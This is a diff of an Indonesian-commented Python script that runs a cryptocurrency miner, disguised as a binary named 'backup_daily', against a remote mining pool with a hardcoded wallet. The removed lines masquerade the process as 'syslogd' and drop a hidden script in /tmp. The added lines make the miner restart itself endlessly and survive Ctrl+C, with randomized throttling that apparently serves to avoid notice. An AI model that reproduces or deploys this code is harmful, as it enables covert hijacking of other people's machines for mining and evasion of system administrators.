@@ -2,15 +2,8 @@ import os
 import subprocess
 import time
 import random
-import ctypes
-
-def set_process_name(name="syslogd"):
-    """Mengubah nama proses agar tidak mencurigakan"""
-    try:
-        libc = ctypes.CDLL("libc.so.6")
-        libc.prctl(15, bytes(name, "utf-8"), 0, 0, 0)
-    except Exception as e:
-        print(f"Gagal mengubah nama proses: {e}")
+import signal
+import sys
 
 def get_numa_info():
     """Mengambil informasi NUMA node dan CPU yang tersedia"""
@@ -40,8 +33,7 @@ def stop_mining():
         print(f"Gagal menghentikan mining: {e}")
 
 def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
-    """Menjalankan proses mining dengan NUMA terbatas dan hidden process tanpa cpulimit"""
-    set_process_name("syslogd")
+    """Menjalankan proses mining dengan NUMA terbatas"""
     numa_info = get_numa_info()
     
     if numa_node not in numa_info:
@@ -56,35 +48,47 @@ def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
     max_threads = total_cpus  # Batasi jumlah maksimum thread sesuai dengan jumlah CPU yang tersedia
     
     while True:
-        while threads <= max_threads:
-            command = f"./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t {threads}"
+        try:
+            while threads <= max_threads:
+                command = f"./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t {threads}"
+                
+                print(f"Menjalankan mining dengan {threads} thread")
+                
+                mining_process = subprocess.Popen(
+                    f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {command} > /dev/null 2>&1",
+                    shell=True
+                )
+                
+                sleep_time = random.randint(55, 60)
+                time.sleep(sleep_time)
+                
+                print(f"Mining dihentikan selama {sleep_time} detik.")
+                stop_mining()
+                
+                time.sleep(10)
+                
+                threads += 1  # Tambah jumlah thread setiap kali mining dihentikan
             
-            print(f"Menjalankan mining dengan {threads} thread")
-            
-            script_content = f"""#!/bin/bash
-            exec -a syslogd {command}
-            """
-            script_path = "/tmp/.syslogd_miner.sh"
-            
-            with open(script_path, "w") as script_file:
-                script_file.write(script_content)
-            os.chmod(script_path, 0o755)
-            
-            mining_process = subprocess.Popen(
-                f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {script_path} > /dev/null 2>&1 &",
-                shell=True
-            )
-            
-            sleep_time = random.randint(55, 60)
-            time.sleep(sleep_time)
-            
-            print(f"Mining dihentikan selama {sleep_time} detik.")
+            threads = initial_threads  # Reset jumlah thread setelah mencapai maksimum
+        except KeyboardInterrupt:
+            print("CTRL+C otomatis ditekan! Menghentikan semua proses mining dan restart...")
             stop_mining()
-            
-            time.sleep(10)
-            
-            threads += 1  # Tambah jumlah thread setiap kali mining dihentikan
-        
-        threads = initial_threads  # Reset jumlah thread setelah mencapai maksimum
+            time.sleep(5)
+            print("Restarting mining...")
+            continue
 
-start_mining(numa_node=0, limit_percent=80, initial_threads=1)
+def signal_handler(sig, frame):
+    print("CTRL+C ditekan! Menghentikan semua proses mining...")
+    stop_mining()
+    sys.exit(0)
+
+# Tangani sinyal SIGINT untuk menangkap CTRL+C
+signal.signal(signal.SIGINT, signal_handler)
+
+# Jalankan mining dengan auto-restart jika terjadi stop
+while True:
+    try:
+        start_mining(numa_node=0, limit_percent=80, initial_threads=1)
+    except Exception as e:
+        print(f"Terjadi kesalahan: {e}, restart mining dalam 5 detik...")
+        time.sleep(5)
